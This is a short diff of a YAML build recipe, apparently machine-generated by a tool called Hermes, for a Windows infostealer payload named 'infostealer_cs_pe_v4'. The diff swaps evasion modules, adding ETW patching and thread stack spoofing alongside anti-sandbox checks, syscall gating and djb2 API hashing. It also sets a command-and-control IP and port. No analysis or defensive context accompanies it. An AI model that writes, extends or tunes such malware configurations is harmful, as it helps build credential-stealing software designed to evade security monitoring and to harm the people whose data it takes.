@@ -1,4 +1,4 @@
-name: infostealer_cs_pe_v2
+name: infostealer_cs_pe_v4
 description: Auto-generated recipe by Hermes (c)
 core:
 - core/emit_buffer
@@ -15,9 +15,9 @@ resources: true
 api_resolve: api_resolve/api_hash_djb2
 evasion:
 - evasion/anti_sandbox
-- evasion/etw_bypass
-- evasion/stack_spoofing
 - evasion/syscall_gate
+- evasion/etw_patch
+- evasion/thread_stack_spoof
 vars:
   C2_IP: 10.0.2.2
   C2_PORT: '9001'
